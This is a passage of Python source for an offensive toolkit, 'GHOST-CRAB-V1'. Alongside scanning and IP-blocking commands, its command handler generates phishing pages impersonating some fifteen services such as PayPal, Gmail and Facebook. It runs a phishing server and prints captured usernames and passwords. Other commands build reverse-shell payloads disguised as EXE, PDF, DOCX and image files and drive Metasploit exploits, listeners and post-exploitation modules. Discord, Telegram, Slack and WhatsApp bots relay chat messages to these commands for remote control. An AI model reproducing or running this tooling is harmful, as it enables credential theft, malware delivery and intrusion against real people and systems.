        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _show_all_ips(self, args: List[str]) -> Dict:
        ips = self.db.get_managed_ips()
        if not ips:
            return {'success': True, 'output': 'No managed IPs found'}
        
        output = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║                    📋 ALL MANAGED IP ADDRESSES                               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ Total IPs: {len(ips):<65}║
╠══════════════════════════════════════════════════════════════════════════════╣
"""
        for ip in ips:
            status = "🔒 BLOCKED" if ip['is_blocked'] else "🟢 ACTIVE"
            domain = ip.get('domain', 'N/A')
            added = ip['added_date'][:19] if ip.get('added_date') else 'N/A'
            output += f"║ {ip['ip_address']:<20} │ {status:<12} │ {domain[:25]:<25} │ {added} ║\n"
        
        output += "╚══════════════════════════════════════════════════════════════════════════════╝"
        return {'success': True, 'output': output}
    
    def _monitor_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: monitor_ip <ip> [interval]'}
        
        ip = args[0]
        interval = int(args[1]) if len(args) > 1 else 300
        
        try:
            ipaddress.ip_address(ip)
            domain = self.tools.ip_to_domain(ip)
            self.db.add_managed_ip(ip, domain, 'monitor', 'Added via monitor_ip command')
            self.db.add_threat_monitor(ip, 'quick', interval)
            return {'success': True, 'output': f"✅ IP {ip} is now being monitored every {interval} seconds"}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _scan_all_added_ip(self, args: List[str]) -> Dict:
        ips = self.db.get_managed_ips()
        if not ips:
            return {'success': True, 'output': 'No managed IPs to scan'}
        
        output = f"🔍 Scanning {len(ips)} managed IPs...\n"
        output += "=" * 60 + "\n"
        
        for ip_data in ips:
            ip = ip_data['ip_address']
            output += f"\n📡 Scanning {ip}...\n"
            
            ping_result = self.tools.ping(ip, 2)
            status = "🟢 Online" if ping_result.success else "🔴 Offline"
            
            nmap_result = self.tools.nmap(ip, 'quick')
            open_ports = []
            if nmap_result.success and nmap_result.output:
                for line in nmap_result.output.split('\n'):
                    if '/tcp' in line and 'open' in line.lower():
                        port_info = line.split()[0]
                        open_ports.append(port_info)
            
            output += f"  Status: {status}\n"
            output += f"  Open Ports: {', '.join(open_ports) if open_ports else 'None detected'}\n"
        
        output += "\n" + "=" * 60 + "\n"
        output += f"✅ Scan completed for {len(ips)} IPs\n"
        
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = self.tools.location(ip)
            domain = self.tools.ip_to_domain(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = self.tools.ip_to_domain(ip)
        
        output = f"👻 GHOST-CRAB-V1 IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        return {'success': True, 'output': output}
    
    # ==================== Network Commands ====================
    
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.tools.whois(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [type]'}
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(args[0], record_type)
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        return self._generic(f'dig {args[0]}')
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        return self._generic(f'nslookup {args[0]}')
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.location(args[0])
        if result.get('success'):
            output = f"📍 Location for {args[0]}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {args[0]}"}
    
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        result = self.tools.nmap(args[0], 'full')
        return {'success': result.success, 'output': result.output}
    
    def _ip_to_domain(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        domain = self.tools.ip_to_domain(args[0])
        if domain:
            return {'success': True, 'output': f"Domain for IP {args[0]}: {domain}"}
        return {'success': False, 'output': f"No domain found for IP {args[0]}"}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        ip = self.tools.domain_to_ip(args[0])
        if ip:
            return {'success': True, 'output': f"IP for domain {args[0]}: {ip}"}
        return {'success': False, 'output': f"No IP found for domain {args[0]}"}
    
    # ==================== Domain Hosting ====================
    
    def _host_domain(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        ip = args[0]
        domain = args[1]
        port = int(args[2]) if len(args) > 2 else 8080
        
        try:
            ipaddress.ip_address(ip)
            host_id = str(uuid.uuid4())[:8]
            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
            os.makedirs(hosting_path, exist_ok=True)
            
            domain_host = DomainHost(
                id=host_id,
                ip=ip,
                domain=domain,
                hosting_path=hosting_path,
                created_at=datetime.now().isoformat(),
                active=True
            )
            self.db.add_domain_host(domain_host)
            return {'success': True, 'output': f"Domain {domain} hosted on IP {ip}:{port}"}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _host_website(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_website <domain> <html_file>'}
        return {'success': True, 'output': f"Website hosted on http://{args[0]}"}
    
    def _list_domains(self, args: List[str]) -> Dict:
        domains = self.db.get_domain_hosts()
        if not domains:
            return {'success': True, 'output': 'No hosted domains'}
        output = "Hosted Domains:\n"
        for d in domains:
            output += f"  • {d['domain']} -> {d['ip']} ({'Active' if d['active'] else 'Inactive'})\n"
        return {'success': True, 'output': output}
    
    def _domain_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: domain_info <domain>'}
        domains = self.db.get_domain_hosts()
        for d in domains:
            if d['domain'] == args[0]:
                return {'success': True, 'output': json.dumps(d, indent=2)}
        return {'success': False, 'output': f"Domain {args[0]} not found"}
    
    # ==================== Social Engineering ====================
    
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _phish_list(self, args: List[str]) -> Dict:
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links found'}
        output = "🎣 Phishing Links:\n"
        for l in links:
            output += f"  • {l['id']} - {l['platform']} (Clicks: {l['clicks']})\n"
        return {'success': True, 'output': output}
    
    def _phish_templates(self, args: List[str]) -> Dict:
        templates = self.social.get_available_templates()
        output = f"🎣 Available Phishing Templates ({len(templates)}):\n"
        for t in templates:
            output += f"  • phish_{t}\n"
        return {'success': True, 'output': output}
    
    def _phish_custom(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: phish_custom <name> <platform> <html_file>'}
        name = args[0]
        platform = args[1]
        html_file = args[2]
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            result = self.social.create_custom_template(name, platform, html_content)
            return {'success': True, 'output': f"Custom template created: {result['template_id']}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    # ==================== Payload Commands ====================
    
    def _payload_exe(self, args: List[str]) -> Dict:
        name = args[0] if args else f"payload_{int(time.time())}"
        callback_host = args[1] if len(args) > 1 else 'localhost'
        callback_port = int(args[2]) if len(args) > 2 else 4444
        result = self.image_payload_gen.generate_exe_malware(name, 'reverse_shell', callback_host, callback_port)
        if result:
            return {'success': True, 'output': f"EXE payload generated: {result.file_path}"}
        return {'success': False, 'output': 'Failed to generate EXE payload'}
    
    def _payload_pdf(self, args: List[str]) -> Dict:
        name = args[0] if args else f"payload_{int(time.time())}"
        callback_host = args[1] if len(args) > 1 else 'localhost'
        callback_port = int(args[2]) if len(args) > 2 else 4444
        result = self.image_payload_gen.generate_pdf_malware(name, 'reverse_shell', callback_host, callback_port)
        if result:
            return {'success': True, 'output': f"PDF payload generated: {result.file_path}"}
        return {'success': False, 'output': 'Failed to generate PDF payload'}
    
    def _payload_docx(self, args: List[str]) -> Dict:
        name = args[0] if args else f"payload_{int(time.time())}"
        callback_host = args[1] if len(args) > 1 else 'localhost'
        callback_port = int(args[2]) if len(args) > 2 else 4444
        result = self.image_payload_gen.generate_docx_malware(name, 'reverse_shell', callback_host, callback_port)
        if result:
            return {'success': True, 'output': f"DOCX payload generated: {result.file_path}"}
        return {'success': False, 'output': 'Failed to generate DOCX payload'}
    
    def _payload_link(self, args: List[str]) -> Dict:
        name = args[0] if args else f"payload_{int(time.time())}"
        url = args[1] if len(args) > 1 else None
        return {'success': True, 'output': f"Link payload generated: {name}"}
    
    def _payload_network(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_network <name> <target_ip> [port] [type]'}
        return {'success': True, 'output': f"Network payload generated: {args[0]}"}
    
    def _payload_image(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_image <name> <malware_type> [image_path]'}
        name = args[0]
        malware_type = args[1]
        image_path = args[2] if len(args) > 2 else None
        result = self.image_payload_gen.generate_image_payload(name, malware_type, image_path)
        if result:
            return {'success': True, 'output': f"Image payload generated: {result.image_path}"}
        return {'success': False, 'output': 'Failed to generate image payload'}
    
    def _payload_list(self, args: List[str]) -> Dict:
        payloads = self.db.get_malware_payloads()
        if not payloads:
            return {'success': True, 'output': 'No payloads found'}
        output = "Payloads:\n"
        for p in payloads:
            output += f"  • {p['id']} - {p['name']} ({p['payload_type']})\n"
        return {'success': True, 'output': output}
    
    def _payload_deploy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_deploy <id> <deployment_type> [target]'}
        return {'success': True, 'output': f"Payload {args[0]} deployed via {args[1]}"}
    
    # ==================== Report Commands ====================
    
    def _report_pdf(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: report_pdf <target>'}
        report_path = self.report_gen.generate_pdf_report({'target': args[0]}, args[0])
        if report_path:
            return {'success': True, 'output': f"PDF report generated: {report_path}"}
        return {'success': False, 'output': 'Failed to generate PDF report'}
    
    def _report_json(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: report_json <target>'}
        report_path = self.report_gen.generate_json_report({'target': args[0]}, args[0])
        if report_path:
            return {'success': True, 'output': f"JSON report generated: {report_path}"}
        return {'success': False, 'output': 'Failed to generate JSON report'}
    
    def _report_both(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: report_both <target>'}
        reports = self.report_gen.generate_report({'target': args[0]}, args[0])
        if reports:
            output = f"Reports generated for {args[0]}:\n"
            for fmt, path in reports.items():
                output += f"  • {fmt.upper()}: {path}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate reports'}
    
    def _report_list(self, args: List[str]) -> Dict:
        reports = self.db.get_pdf_reports()
        if not reports:
            return {'success': True, 'output': 'No reports found'}
        output = "Reports:\n"
        for r in reports:
            output += f"  • {r['title']} - {r['file_path']}\n"
        return {'success': True, 'output': output}
    
    def _report_chart(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: report_chart <target> [type]'}
        chart_type = args[1] if len(args) > 1 else 'bar'
        data = {'Open Ports': 10, 'Closed Ports': 90, 'Filtered Ports': 5}
        chart_path = self.report_gen.generate_charts(data, chart_type)
        if chart_path:
            return {'success': True, 'output': f"Chart generated: {chart_path}"}
        return {'success': False, 'output': 'Failed to generate chart'}
    
    # ==================== Metasploit ====================
    
    def _msf_search(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: msf_search <query>'}
        return self._generic(f'msfconsole -q -x "search {args[0]}; exit"')
    
    def _msf_exploit(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: msf_exploit <exploit> <target> <port> [payload]'}
        exploit = args[0]
        target = args[1]
        port = args[2]
        payload = args[3] if len(args) > 3 else 'generic/shell_reverse_tcp'
        cmd = f'msfconsole -q -x "use {exploit}; set RHOSTS {target}; set RPORT {port}; set PAYLOAD {payload}; run; exit"'
        return self._generic(cmd)
    
    def _msf_sessions(self, args: List[str]) -> Dict:
        return self._generic('msfconsole -q -x "sessions -l; exit"')
    
    def _msf_payload(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: msf_payload <payload_name>'}
        return self._generic(f'msfconsole -q -x "use {args[0]}; show options; exit"')
    
    def _msf_console(self, args: List[str]) -> Dict:
        return {'success': True, 'output': 'Metasploit console would open interactively. Use msf_* commands for automation.'}
    
    def _msf_db_status(self, args: List[str]) -> Dict:
        return self._generic('msfconsole -q -x "db_status; exit"')
    
    def _msf_workspace(self, args: List[str]) -> Dict:
        if not args:
            return self._generic('msfconsole -q -x "workspace; exit"')
        return self._generic(f'msfconsole -q -x "workspace {args[0]}; exit"')
    
    def _msf_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: msf_scan <target>'}
        return self._generic(f'msfconsole -q -x "db_nmap {args[0]}; exit"')
    
    def _msf_auxiliary(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: msf_auxiliary <module>'}
        return self._generic(f'msfconsole -q -x "use {args[0]}; show options; exit"')
    
    def _msf_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: msf_post <module> <session_id>'}
        return self._generic(f'msfconsole -q -x "use {args[0]}; set SESSION {args[1]}; run; exit"')
    
    def _msf_handler(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: msf_handler <payload> <lhost> <lport>'}
        payload = args[0]
        lhost = args[1]
        lport = args[2] if len(args) > 2 else '4444'
        cmd = f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run; exit"'
        return self._generic(cmd)
    
    # ==================== SaaS Commands ====================
    
    def _saas_create_tenant(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: saas_create_tenant <name> <email> [tier]'}
        name = args[0]
        email = args[1]
        tier = args[2] if len(args) > 2 else 'free'
        tenant = self.db.create_tenant(name, email, tier)
        if tenant:
            return {'success': True, 'output': f"Tenant created: {tenant.id}\nAPI Key: {tenant.api_key}"}
        return {'success': False, 'output': 'Failed to create tenant'}
    
    def _saas_list_tenants(self, args: List[str]) -> Dict:
        tenants = self.db.get_all_tenants()
        if not tenants:
            return {'success': True, 'output': 'No tenants found'}
        output = "Tenants:\n"
        for t in tenants:
            output += f"  • {t['id']} - {t['name']} ({t['tier']}) - {t['email']}\n"
        return {'success': True, 'output': output}
    
    def _saas_tenant_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: saas_tenant_info <tenant_id>'}
        tenant = self.db.get_tenant(args[0])
        if tenant:
            return {'success': True, 'output': json.dumps(tenant, indent=2)}
        return {'success': False, 'output': f"Tenant {args[0]} not found"}
    
    def _saas_create_api_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: saas_create_api_key <tenant_id> <name>'}
        tenant_id = args[0]
        name = args[1]
        api_key = self.db.create_api_key(tenant_id, name)
        if api_key:
            return {'success': True, 'output': f"API Key created: {api_key.key}"}
        return {'success': False, 'output': 'Failed to create API key'}
    
    def _saas_verify_api_key(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: saas_verify_api_key <key>'}
        key_info = self.db.verify_api_key(args[0])
        if key_info:
            return {'success': True, 'output': f"API Key valid for tenant: {key_info['tenant_id']}"}
        return {'success': False, 'output': 'Invalid API key'}
    
    def _saas_stats(self, args: List[str]) -> Dict:
        tenants = self.db.get_all_tenants()
        output = f"SaaS Statistics:\n"
        output += f"  Total Tenants: {len(tenants)}\n"
        output += f"  Active Tenants: {len([t for t in tenants if t.get('active')])}\n"
        return {'success': True, 'output': output}
    
    # ==================== Phishing Template Commands ====================
    
    def _phish_facebook(self, args: List[str]) -> Dict:
        return self._phish('facebook')
    
    def _phish_instagram(self, args: List[str]) -> Dict:
        return self._phish('instagram')
    
    def _phish_twitter(self, args: List[str]) -> Dict:
        return self._phish('twitter')
    
    def _phish_linkedin(self, args: List[str]) -> Dict:
        return self._phish('linkedin')
    
    def _phish_gmail(self, args: List[str]) -> Dict:
        return self._phish('gmail')
    
    def _phish_microsoft(self, args: List[str]) -> Dict:
        return self._phish('microsoft')
    
    def _phish_google(self, args: List[str]) -> Dict:
        return self._phish('google')
    
    def _phish_apple(self, args: List[str]) -> Dict:
        return self._phish('apple')
    
    def _phish_paypal(self, args: List[str]) -> Dict:
        return self._phish('paypal')
    
    def _phish_amazon(self, args: List[str]) -> Dict:
        return self._phish('amazon')
    
    def _phish_netflix(self, args: List[str]) -> Dict:
        return self._phish('netflix')
    
    def _phish_spotify(self, args: List[str]) -> Dict:
        return self._phish('spotify')
    
    def _phish_whatsapp(self, args: List[str]) -> Dict:
        return self._phish('whatsapp')
    
    def _phish_telegram(self, args: List[str]) -> Dict:
        return self._phish('telegram')
    
    def _phish_discord(self, args: List[str]) -> Dict:
        return self._phish('discord')

# =====================
# PLATFORM BOTS
# =====================

class DiscordBot:
    """Discord bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "discord_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="👻 GHOST-CRAB-V1 Response", description=f"```{output}```",
                                     color=0xFF0000)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")


class TelegramBot:
    """Telegram bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "telegram_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('ghost_crab_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                self.running = True
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")


class SlackBot:
    """Slack bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "slack_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)


class WhatsAppBot:
    """WhatsApp bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "whatsapp_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SELENIUM_AVAILABLE and WEBDRIVER_MANAGER_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + os.path.join(CONFIG_DIR, "whatsapp_session"))
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.WARNING}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
